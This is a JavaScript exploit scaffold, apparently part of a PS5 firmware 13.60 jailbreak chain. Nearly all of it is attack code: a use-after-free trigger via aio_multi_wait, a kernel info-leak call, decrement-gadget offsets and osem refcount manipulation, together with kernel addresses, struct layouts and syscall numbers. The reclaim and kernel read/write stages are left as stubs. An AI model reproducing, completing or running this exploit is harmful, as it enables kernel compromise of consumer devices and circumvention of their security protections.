/*
 * bagagwa.js -- PS5 FW 13.60 kernel stage ("Bagagwa" multi-chain).
 *
 * Chain: aio_multi_wait mode-0 UAF  ->  two arbitrary 32-bit decrements
 *        ->  osem refcount (+0x54) decrement-to-zero  ->  free  ->  reclaim
 *        ->  kernel R/W mirror  ->  p2jb_poops stage-7 (elfldr + payload).
 *
 * This file is the KERNEL-STAGE SCAFFOLD. It carries every primitive that can
 * be written without a 13.60 kernel dump, exactly keyed to the verified
 * writeup. Everything that requires a per-firmware constant that only a kernel
 * dump (or a runtime leak) can produce is left as an explicit TODO, shaped like
 * offsets/13.20.js so that a dump later turns each TODO into a number.
 *
 * The "Rule of Thumb: DO NOT SUMMON BAGAGWA" note is not functionality; it is
 * the warning that once the decrement-to-free pair is armed, a second wake on a
 * sibling request will run the decrement again on whatever now occupies [0]
 * and [8] -- the destructive step, not something to trigger casually.
 *
 * Verified (from syscalls.js + the writeup):
 *   aio_multi_wait   = 0x297 (663)   -- 5 args: (ids, num, states, mode, timeout)
 *   aio debug info   = 0x2D7 (727)   -- internal; no libkernel stub (absent from map)
 *   osem_create..cancel = 0x225..0x22C
 *
 * Unverified / pending-per-firmware is marked [13.60?].
 */
(function (root) {
    "use strict";

    /* ------------------------------------------------------------------ *
     * 13.60 USERLAND OFFSETS (identical to noslop/offsets/offsets.json and
     * mansoor0x/POC offsets.mjs). These drive the WebKit stage, not the kernel
     * stage, but the kernel stage's ROP needs the derived libkernel_web base. *
     * ------------------------------------------------------------------ */
    const USERLAND_1360 = Object.freeze({
        hc: [0x56a58, 0x56ca0, 0x57ce8],   // host-constructor candidates
        gd: 0x1d6fa,                       // natural trampoline / gadget
        nt: 0x48b0,                        // notify entry
        gps: 0x334e238, gpe: 0x1b860,      // getpid slot / export
        cls: 0x334e228, cle: 0x274e0,      // close slot / export
        ers: 0x334e230, ere: 0xf7d0        // error slot / export
    });

    /* ------------------------------------------------------------------ *
     * KERNEL ANCHORS -- absolute (unslid) addresses from the verified
     * writeup. At runtime the KASLR slide is unknown and must come from the
     * 727 leak (or a kernel base leak). These are the *relative* anchors for
     * 13.60; treat every one as "verify slide at runtime". *
     * ------------------------------------------------------------------ */
    const K = Object.freeze({
        aio_multi_wait:  0xffffffff805c0210n,
        aio_mode_dispatch: 0xffffffff805c078cn,
        aio_mode0_entry:   0xffffffff805c08e5n,   // rcx = [rbx+0x40]  (always elem 0)
        aio_mode1_entry:   0xffffffff805c0798n,
        aio_mode2_entry:   0xffffffff805c084an,
        aio_mode2_init8:   0xffffffff805c089an,   // mode 2 inits node->[8]
        aio_unlink:        0xffffffff805c0da1n,   // unlink by node->owner
        aio_free_array:    0xffffffff805c0f93n,
        aio_waker:         0xffffffff805c1d2dn,
        aio_debug_info:    0xffffffff805c3090n,   // get_aio_debug_request_info
        aio_debug_copy:    0xffffffff805c3325n,   // index-bias copy loop
        osem_delete:       0xffffffff80e2632en,
        osem_free_entry:   0xffffffff80e2635dn,   // flag clear -> skip refcount, free
        osem_alloc:        0xffffffff80e26120n    // malloc(0x60, M_osem)
    });

    /* ------------------------------------------------------------------ *
     * STRUCT LAYOUTS (from the writeup; these are the load-bearing offsets)
     * ------------------------------------------------------------------ */
    const WAITER = Object.freeze({
        STRIDE: 0x38,        // add r14, 0x38 walk step
        P0:  0x00,           // qword  -- first  dec dword ptr [r15]
        P1:  0x08,           // qword  -- second dec dword ptr [r15+8] (M_ZERO in mode0)
        LOCK: 0x10,          // qword  -- mtx_lock([r15+0x10]+0x18)
        OWNER: 0x18,         // qword  -- overwritten every iteration
        W32: 0x20,           // dword  -- mov dword ptr [r15+0x20], eax
        SIZE: 0x28           // node ends at +0x28..0x37 (padding)
    });

    const OSEM = Object.freeze({
        ALLOC: 0x60,         // malloc(0x60, M_osem) -> 96 bytes, 128 zone
        FLAG: 0x45,          // byte; bit0 set => refcount path, clear => free() directly
        REFCOUNT: 0x54,      // u32; exactly the AIO decrement width
        // r14 secondary allocation and the osem_wait/post deref layout are [13.60?]
        SECONDARY: null
    });

    const ZONES = Object.freeze({
        // waiter array size = num * 0x38; osem = 0x60. Both land in the 128/256
        // zones that the 727 leak reports addresses from.
        WAITER_NUM2: 0x70,   // 112 -> 128 zone  (0x70)
        WAITER_NUM3: 0xa8,   // 168 -> 256 zone
        WAITER_NUM4: 0xe0,   // 224 -> 256 zone
        OSEM: 0x60           // 96  -> 128 zone
    });

    /* ------------------------------------------------------------------ *
     * SYSCALL NUMBERS
     * ------------------------------------------------------------------ */
    const SYS = Object.freeze({
        AIO_MULTI_WAIT: 0x297n,   // 663
        AIO_DEBUG_INFO: 0x2d7n,   // 727 -- internal, no libkernel stub
        OSEM_CREATE:  0x225n,
        OSEM_DELETE:  0x226n,
        OSEM_OPEN:    0x227n,
        OSEM_CLOSE:   0x228n,
        OSEM_WAIT:    0x229n,
        OSEM_TRYWAIT: 0x22an,
        OSEM_POST:    0x22bn,
        OSEM_CANCEL:  0x22cn
    });

    /* ------------------------------------------------------------------ *
     * RUNTIME ADAPTER
     *
     * bagagwa.js is harness-agnostic. Wire a `runtime` object that supplies the
     * raw syscall trampoline, a kernel-address-accurate allocation, and logging.
     *
     *   runtime.syscall(nr, a1, a2, a3, a4, a5, a6) -> BigInt (retval)
     *   runtime.malloc(size) -> BigInt (userland addr, but the spray chunks are
     *                            kernel-side: see reclaim caveat below)
     *   runtime.log(fmt, ...) -> void
     *
     * With pooP2JB: runtime.syscall === window.G ? G.syscall (rop-worker fireSync).
     * ------------------------------------------------------------------ */
    function toBig(v) {
        if (typeof v === "bigint") return v;
        if (v && (typeof v.low !== "undefined" || typeof v.hi !== "undefined"))
            return (BigInt((v.hi || v.high || 0) >>> 0) << 32n) | BigInt(v.low >>> 0);
        return BigInt(v >>> 0);
    }
    function ptr(v) { const b = toBig(v); if (b < 0x1000n) throw new Error("bagagwa: bad pointer 0x" + b.toString(16)); return b; }

    function bagagwa(runtime) {
        if (!runtime || typeof runtime.syscall !== "function")
            throw new Error("bagagwa: runtime.syscall required");
        const S = function (nr, a1, a2, a3, a4, a5, a6) {
            const r = runtime.syscall(nr,
                a1 === undefined ? undefined : toBig(a1),
                a2 === undefined ? undefined : toBig(a2),
                a3 === undefined ? undefined : toBig(a3),
                a4 === undefined ? undefined : toBig(a4),
                a5 === undefined ? undefined : toBig(a5),
                a6 === undefined ? undefined : toBig(a6));
            return toBig(r);
        };
        const log = runtime.log || ((m) => root.console && root.console.log(m));

        /* ---- 727 leak ------------------------------------------------- *
         * get_aio_debug_request_info (0x2D7). Parameterized because the exact
         * user-facing argument order is [13.60?]. The writeup fixes the shape:
         *   - bound: [1, table->0x228], and req_id>>16 < 0x80
         *   - copy loop dest index bounded by `count`, source index
         *     = (req_id>>16) + edx, scaled 0x28 into [rax+0x20]
         *   - each element leaks a dword at +0x20 and two 8-byte pointers
         * Tune (args, outBuf) on target once the handler is disassembled.       */
        async function leakAioDebug(reqId, count, outBuf) {
            // Placeholder ABI -- fill from the disassembly [13.60?]
            const ret = S(SYS.AIO_DEBUG_INFO,
                toBig(reqId), toBig(count), ptr(outBuf));
            log("bagagwa: leakAioDebug req_id=0x" + toBig(reqId).toString(16)
                + " count=" + Number(count) + " ret=0x" + ret.toString(16));
            // caller reads outBuf (dword + 2 pointers per element)
            return ret;
        }

        /* ---- aio_multi_wait mode-0 UAF trigger ------------------------ *
         * args: (ids, num, states, mode, timeout). num >= 2 and mode == 0
         * links node[0] onto all N request waiter lists; cleanup only unlinks
         * from the last owner, then frees the array -> requests 0..N-2 keep
         * dangling waiters into the freed 0x38*num chunk.                    */
        async function triggerUaf(num, options) {
            const o = options || {};
            const n = Number(num);
            if (n < 2) throw new Error("bagagwa: mode-0 UAF needs num >= 2");
            const ids   = ptr(o.ids);
            const state = ptr(o.states);
            const mode  = toBig(o.mode !== undefined ? o.mode : 0);
            const tmo   = o.timeout === undefined ? 0n : toBig(o.timeout);
            const ret = S(SYS.AIO_MULTI_WAIT, ids, BigInt(n), state, mode, tmo);
            log("bagagwa: triggerUaf num=" + n + " mode=" + Number(mode)
                + " ret=0x" + ret.toString(16));
            // A 0/partial return can still leave the UAF armed; the living
            // evidence is the freed waiter array now aliased by req 0..N-2.
            return ret;
        }

        /* ---- decrement gadget ----------------------------------------- *
         * After triggerUaf() frees the node array, reclaim it with a fake
         * node (see reclaim note) whose [0]/[8] = decrement targets, then
         * complete a still-dangling request to run the waker
           *   mov [r15+0x20], eax ; mtx_lock([r15+0x10]+0x18)
         *   dec [r15] ; dec [r15+8]
         * One wake == up to TWO 32-bit decrements.                          */
        function dance(fakeNode) {
            const f = ptr(fakeNode);
            // Two decrement targets, straight out of the waker. Each is a
            // single 32-bit atomic dec. Use both for the refcount pair below.
            return {
                decTargetA: f + BigInt(WAITER.P0),
                decTargetB: f + BigInt(WAITER.P1),
                lockField:  f + BigInt(WAITER.LOCK),
                ownerField: f + BigInt(WAITER.OWNER),
                writeField: f + BigInt(WAITER.W32)
            };
        }

        /* ---- osem refcount ops --------------------------------------- *
         * osem_open      : inc [obj+0x54]
         * osem_close     : dec [obj+0x54]; free at zero
         * osem_delete    : test [obj+0x45],1 ; jz -> free(r14), free(rbx)
         * Target: decrement +0x54 to 0 with the two AIO decrements, then
         * osem_delete via the flag-clear path refcount-frees the object while
         * a live handle still aliases it -> reclaim -> mirror.              */
        async function osemOpen(nameBuf, flags, mode) {
            return S(SYS.OSEM_OPEN, ptr(nameBuf), flags === undefined ? 0n : toBig(flags),
                mode === undefined ? 0n : toBig(mode));
        }
        async function osemClose(sem)  { return S(SYS.OSEM_CLOSE, toBig(sem)); }
        async function osemDelete(sem) { return S(SYS.OSEM_DELETE, toBig(sem)); }

        return Object.freeze({
            SYS, K, WAITER, OSEM, ZONES, USERLAND_1360,
            leakAioDebug, triggerUaf, dance, osemOpen, osemClose, osemDelete,
            /* [13.60?] reclaimed-chunk content injection -- the primitive we
             * need to place [0]/[8]/[0x10]/[0x20] into a freed 0x70 node.
             * Candidate: setsockopt rthdr spray (p2jb-style), or re-entering
             * aio_multi_wait with attacker-shaped node fields. */
            reclaimFakeNode: null,
            /* [13.60?] kernel R/W mirror built on the reclaimed osem. Emits the
             * `p.read1/2/4/8` + `p.write1/2/4/8` that p2jb_poops.js consumes. */
            buildMirror: null
        });
    }

    /* ---- 13.60 KERNEL OFFSETS STILL REQUIRED -------------------------- *
     * Mirrors offsets/13.20.js. Each entry is what a 13.60 kernel dump (or a
     * sufficient 727 leak chain) must provide. Fill and ship as offsets/13.60.js.
     * ------------------------------------------------------------------ */
    const KERNEL_OFFSETS_NEEDED = Object.freeze({
        // libkernel_web RVA (rva = file_off - 0x4000), like 13.20.js
        lk_syscall_stub_map: "per-syscall libkernel_web stub RVAs (0x225..0x297, etc.)",
        lk_syscall_wrapper:  "mov r10,rcx; syscall; ret  (13.20 ~0x1AE27/0x1AE47)",
        lk_worker_stack:     "WORKER_STACK_OFFSET (13.20 = 0x7FB88)",
        lk_pthread_create:   "scePthreadCreate (13.20 pthread_create_name_np=0x21890)",
        lc_setjmp_longjmp:   "libc setjmp/longjmp (13.20 = 0x5D990 / 0x5D9E0)",
        wk_gadgetmap:        "WebKit gadgets (13.20 ret/pop r* set available)",
        kdata_base:          "kernel base + slide anchor (needed to rebase K.*)",
        thread_list:         "allproc/thread_list for stage-6 priv-esc",
        pipe_buffer:         "pipe_buffer/osten layout for the mirror endgame",
        osem_internals:      "OSEM.SECONDARY + osem_wait/post deref layout"
    });

    root.Bagagwa = Object.freeze({ bagagwa, KERNEL_OFFSETS_NEEDED, SYS, K, WAITER, OSEM, ZONES });
    if (typeof root.console !== "undefined" && root.console.log)
        root.console.log("[bagagwa] 13.60 kernel stage scaffold loaded; "
            + "kernel offsets pending:" + Object.keys(KERNEL_OFFSETS_NEEDED).length);
})(typeof window !== "undefined" ? window : globalThis);